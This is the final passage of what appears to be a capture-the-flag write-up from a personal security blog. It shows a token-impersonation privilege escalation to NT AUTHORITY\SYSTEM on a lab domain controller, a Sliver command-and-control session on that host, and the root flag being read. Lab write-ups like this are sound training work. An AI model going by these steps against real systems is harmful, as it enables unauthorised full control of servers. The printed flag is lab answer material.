<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Start<span class="w"> </span>Search<span class="w"> </span>System<span class="w"> </span>Token
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>PID<span class="w"> </span>:<span class="w"> </span><span class="m">916</span><span class="w"> </span>Token:0x628<span class="w">  </span>User:<span class="w"> </span>NT<span class="w"> </span>AUTHORITY<span class="se">\S</span>YSTEM<span class="w"> </span>ImpersonationLevel:<span class="w"> </span>Impersonation
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Find<span class="w"> </span>System<span class="w"> </span>Token<span class="w"> </span>:<span class="w"> </span>True
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>UnmarshalObject:<span class="w"> </span>0x80070776
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>CurrentUser:<span class="w"> </span>NT<span class="w"> </span>AUTHORITY<span class="se">\S</span>YSTEM
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>process<span class="w"> </span>start<span class="w"> </span>with<span class="w"> </span>pid<span class="w"> </span><span class="m">3004</span>
</code></pre></div>
<p>On the new session, I am <code>NT AUTHORITY\SYSTEM</code>.</p>
<div class="highlight"><pre><span></span><code>sliver<span class="w"> </span><span class="o">(</span>COLOURFUL_GUILTY<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>info

<span class="w">        </span>Session<span class="w"> </span>ID:<span class="w"> </span>c80f5dd8-d782-4bbf-abf6-1b18fb9fd2f5
<span class="w">              </span>Name:<span class="w"> </span>COLOURFUL_GUILTY
<span class="w">          </span>Hostname:<span class="w"> </span>BREACHDC
<span class="w">              </span>UUID:<span class="w"> </span><span class="m">91753042</span>-9532-69dc-dbc7-e9484b42f13e
<span class="w">          </span>Username:<span class="w"> </span>NT<span class="w"> </span>AUTHORITY<span class="se">\S</span>YSTEM
<span class="w">               </span>UID:<span class="w"> </span>S-1-5-18
<span class="w">               </span>GID:<span class="w"> </span>S-1-5-18
<span class="w">               </span>PID:<span class="w"> </span><span class="m">7056</span>
<span class="w">                </span>OS:<span class="w"> </span>windows
<span class="w">           </span>Version:<span class="w"> </span>Server<span class="w"> </span><span class="m">2016</span><span class="w"> </span>build<span class="w"> </span><span class="m">20348</span><span class="w"> </span>x86_64
<span class="w">            </span>Locale:<span class="w"> </span>en-US
<span class="w">              </span>Arch:<span class="w"> </span>amd64
<span class="w">         </span>Active<span class="w"> </span>C2:<span class="w"> </span>mtls://10.10.14.204:8443
<span class="w">    </span>Remote<span class="w"> </span>Address:<span class="w"> </span><span class="m">10</span>.129.38.236:63285
<span class="w">         </span>Proxy<span class="w"> </span>URL:<span class="w"> </span>
Reconnect<span class="w"> </span>Interval:<span class="w"> </span>1m0s
<span class="w">     </span>First<span class="w"> </span>Contact:<span class="w"> </span>Sat<span class="w"> </span>Oct<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">03</span>:51:30<span class="w"> </span>PDT<span class="w"> </span><span class="m">2025</span><span class="w"> </span><span class="o">(</span>17s<span class="w"> </span>ago<span class="o">)</span>
<span class="w">      </span>Last<span class="w"> </span>Checkin:<span class="w"> </span>Sat<span class="w"> </span>Oct<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">03</span>:51:30<span class="w"> </span>PDT<span class="w"> </span><span class="m">2025</span><span class="w"> </span><span class="o">(</span>17s<span class="w"> </span>ago<span class="o">)</span>

sliver<span class="w"> </span><span class="o">(</span>COLOURFUL_GUILTY<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>getuid

S-1-5-18

sliver<span class="w"> </span><span class="o">(</span>COLOURFUL_GUILTY<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>whoami

Logon<span class="w"> </span>ID:<span class="w"> </span>NT<span class="w"> </span>AUTHORITY<span class="se">\S</span>YSTEM
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Current<span class="w"> </span>Token<span class="w"> </span>ID:<span class="w"> </span>NT<span class="w"> </span>AUTHORITY<span class="se">\S</span>YSTEM
</code></pre></div>
<p>Flag</p>
<div class="highlight"><pre><span></span><code>sliver<span class="w"> </span><span class="o">(</span>COLOURFUL_GUILTY<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>cat<span class="w"> </span>c:/users/administrator/desktop/root.txt

fc98f418f94f8cdb9a30ef026fe64345
</code></pre></div>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251029221158.png" data-desc-position="bottom"><img alt="Pasted_image_20251029221158.png" src="../../../../Pasted_image_20251029221158.png"></a></p>







  
    
  
  
    
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"></path></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="October 30, 2025 05:30:00 UTC">October 30, 2025</span>
  </span>

    
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Created">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"></path></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="October 25, 2025 19:53:21 UTC">October 25, 2025</span>
  </span>

    
    
    
  </aside>





                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        
<div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://github.com/SYANiDE-" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"></path></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://www.linkedin.com/in/chasejhatch/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"></path></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://discord.com/users/298244420195844096" target="_blank" rel="noopener" title="discord.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M492.5 69.8c-.2-.3-.4-.6-.8-.7-38.1-17.5-78.4-30-119.7-37.1-.4-.1-.8 0-1.1.1s-.6.4-.8.8c-5.5 9.9-10.5 20.2-14.9 30.6-44.6-6.8-89.9-6.8-134.4 0-4.5-10.5-9.5-20.7-15.1-30.6-.2-.3-.5-.6-.8-.8s-.7-.2-1.1-.2C162.5 39 122.2 51.5 84.1 69c-.3.1-.6.4-.8.7C7.1 183.5-13.8 294.6-3.6 404.2c0 .3.1.5.2.8s.3.4.5.6c44.4 32.9 94 58 146.8 74.2.4.1.8.1 1.1 0s.7-.4.9-.7c11.3-15.4 21.4-31.8 30-48.8.1-.2.2-.5.2-.8s0-.5-.1-.8-.2-.5-.4-.6-.4-.3-.7-.4c-15.8-6.1-31.2-13.4-45.9-21.9-.3-.2-.5-.4-.7-.6s-.3-.6-.3-.9 0-.6.2-.9.3-.5.6-.7c3.1-2.3 6.2-4.7 9.1-7.1.3-.2.6-.4.9-.4s.7 0 1 .1c96.2 43.9 200.4 43.9 295.5 0 .3-.1.7-.2 1-.2s.7.2.9.4c2.9 2.4 6 4.9 9.1 7.2.2.2.4.4.6.7s.2.6.2.9-.1.6-.3.9-.4.5-.6.6c-14.7 8.6-30 15.9-45.9 21.8-.2.1-.5.2-.7.4s-.3.4-.4.7-.1.5-.1.8.1.5.2.8c8.8 17 18.8 33.3 30 48.8.2.3.6.6.9.7s.8.1 1.1 0c52.9-16.2 102.6-41.3 147.1-74.2.2-.2.4-.4.5-.6s.2-.5.2-.8c12.3-126.8-20.5-236.9-86.9-334.5zm-302 267.7c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.4 59.2-52.8 59.2m195.4 0c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.2 59.2-52.8 59.2"></path></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.tabs", "navigation.tabs.sticky", "navigation.expand", "navigation.path", "navigation.prune", "navigation.indexes", "toc.follow", "toc.integrate", "navigation.top", "header.autohide", "search.highlight", "search.share"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
      
        <script src="../../../../javascripts/mathjax.js"></script>
      
        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
        <script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
      
        <script src="../../../../javascripts/app.js"></script>
      
        <script src="../../../../js/asciinema-player.min.js"></script>
      
        <script src="../../../../assets/javascripts/panzoom.min.js"></script>
      
        <script src="../../../../assets/javascripts/zoompan.js"></script>
      
    
  
<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": false, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
document$.subscribe(()=>{ lightbox.reload(); });
</script></body></html>